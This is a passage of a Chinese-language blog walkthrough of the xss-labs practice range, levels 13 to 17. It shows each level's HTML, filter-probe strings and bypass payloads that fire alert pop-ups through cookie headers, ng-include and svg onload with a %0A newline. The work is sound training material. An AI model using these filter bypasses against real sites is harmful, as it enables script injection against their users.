class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和good job!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_cook&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level13.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:9<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>名字是t_cook，考虑到是cookie头，我们先看一下这个网页的cookie，F12打开</p><blockquote><p>​<code>&quot; onclick=alert() type=&quot;text </code>​</p></blockquote><p>由于我看不到cookie，我直接构造一个cookie传参，hackbar</p><p><img src="/.com//226c9a180fbc0d54ea9aa0a118ecd970-20250425110507-0240htz.png" alt="226c9a180fbc0d54ea9aa0a118ecd970"></p><p>再刷新一下，点击框框就好了</p><p>再看一下这关的源码</p><p><img src="/.com//d6080656137ce7cddf4f41355afaecf5-20250425110518-wedn7dq.png" alt="d6080656137ce7cddf4f41355afaecf5"></p><p>一样，就一个头的区别</p><p>  <strong>本关小结</strong>：还是http头传参</p><hr><h1 id="level14（暂时无法做）"><a href="#level14（暂时无法做）" class="headerlink" title="level14（暂时无法做）"></a>level14（暂时无法做）</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level14<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level14<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;leftframe&quot;</span> <span class="hljs-attr">marginwidth</span>=<span class="hljs-string">10</span> <span class="hljs-attr">marginheight</span>=<span class="hljs-string">10</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">no</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;80%&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">80%</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">/xss/level15.php?src</span>=<span class="hljs-string">1.gif</span>&gt;</span>点我进level15<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这关没啥交互，只是会定时转跳到一个奇怪的已经挂掉了的网站，直接看一下后端源码吧</p><p><img src="/.com//ce8a176053ee174b185ead81e09e3394-20250425110706-mp9800m.png" alt="ce8a176053ee174b185ead81e09e3394"></p><p>emmm，跟网站源码一样，这题本来是利用转跳到的网站，在那网站去上传一个，属性里面含有xss代码的图片，以达到弹窗的效果，具体可参考<a href="https://www.freebuf.com/articles/web/282983.html" title="xss-labs靶场-第十四关">xss-labs靶场-第十四关</a></p><p> 由于网站挂了，这里就不能演示</p><hr><h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">ng-app</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level15<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到第15关，自己想个办法走出去吧！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level15.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ng-include:&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到这儿有个陌生的东西ng-include</p><blockquote><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p></blockquote><p>我们先试试看包涵第一关，构建payload</p><blockquote><p>​<code>?src=&#39;/level1.php&#39;</code>​</p></blockquote><p>所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload</p><blockquote><p>​<code>?src=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">ng-app</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level15<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到第15关，自己想个办法走出去吧！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level15.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ng-include:<span class="hljs-symbol">&amp;quot;</span> &#x27; sRc DaTa OnFocus <span class="hljs-symbol">&amp;lt;</span>sCriPt<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a hReF=javascript:alert()<span class="hljs-symbol">&amp;gt;</span> &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload</p><blockquote><p>​<code>?src=&#39;/level1.php?name=&lt;img src=1 onmouseover=alert()&gt;&#39;</code>​</p></blockquote><p>当然也能用p标签，可以构造payload</p><blockquote><p>​<code>?src=&#39;/level1.php?name=&lt;p onmousedown=alert()&gt;哈哈哈&lt;/p&gt;&#39;</code>​</p></blockquote><p>点击哈哈哈即可弹窗，接下来我们看一下这关的后端源码</p><p><img src="/assets/e9a2de48a5b5481081deadd2c07a1c2f-20250425111946-puoeete.png" alt="e9a2de48a5b5481081deadd2c07a1c2f"></p><p>实体化函数，形同虚设</p><p>  <strong>本关小结</strong>：ng-include文件包涵，可以无视html实体化</p><hr><h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level16.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:4<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test插入到了center标签中，所以这里就不用闭合了，老规矩，先测试一波关键字</p><blockquote><p>​<code>?keyword=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106; </code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;nbsp;</span>&#x27;<span class="hljs-symbol">&amp;nbsp;</span>src<span class="hljs-symbol">&amp;nbsp;</span>data<span class="hljs-symbol">&amp;nbsp;</span>onfocus<span class="hljs-symbol">&amp;nbsp;</span>onmouseover<span class="hljs-symbol">&amp;nbsp;</span>onmousedown<span class="hljs-symbol">&amp;nbsp;</span>p<span class="hljs-symbol">&amp;nbsp;</span>&lt;<span class="hljs-symbol">&amp;nbsp;</span>&gt;<span class="hljs-symbol">&amp;nbsp;</span>&lt;a<span class="hljs-symbol">&amp;nbsp;</span>href=java<span class="hljs-symbol">&amp;nbsp;</span>:alert()&gt;<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level16.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:139<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对比发现，这里先是将字母小写化了，再把script替换成空格，最后将空格给实体化，想尝试一下p标签&lt;p οnmοusedοwn=alert()&gt;abc&lt;/p&gt;，谁知道也将/给替换成了空格，无奈，只好看一下后端源码</p><p><img src="/assets/52366f7247628ff8f84c1263e04f81cc-20250425112031-w445z9g.png" alt="52366f7247628ff8f84c1263e04f81cc"></p><p>果然给过掉了，空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用/的&lt;img&gt;、&lt;details&gt;、&lt;svg&gt;等标签，更多标签可参考<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782" title="XSS常见的触发标签">XSS常见的触发标签</a></p><p> 随便选个标签，将空格替换成回车的url编码，构造payload</p><blockquote><p>​<code>?keyword=&lt;svg%0Aonload=alert(1)&gt;</code>​</p></blockquote><p><strong>本关小结</strong>：回车代替空格绕过检测</p><hr><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>先测测关键字吧</p><blockquote><p>​<code>?arg01=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?&amp;quot;</span> &#x27; <span class="hljs-attr">sRc</span> <span class="hljs-attr">DaTa</span> <span class="hljs-attr">OnFocus</span> <span class="hljs-attr">OnmOuseOver</span> <span class="hljs-attr">OnMouseDoWn</span> <span class="hljs-attr">P</span> &lt;<span class="hljs-attr">sCriPt</span>&gt;</span> <span class="hljs-symbol">&amp;lt;</span>a hReF=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>; =<span class="hljs-symbol">&amp;quot;</span> &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-symbol">&amp;lt;</span>sCriPt<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a hReF=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>; width=100% heigth=100%&gt;    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span 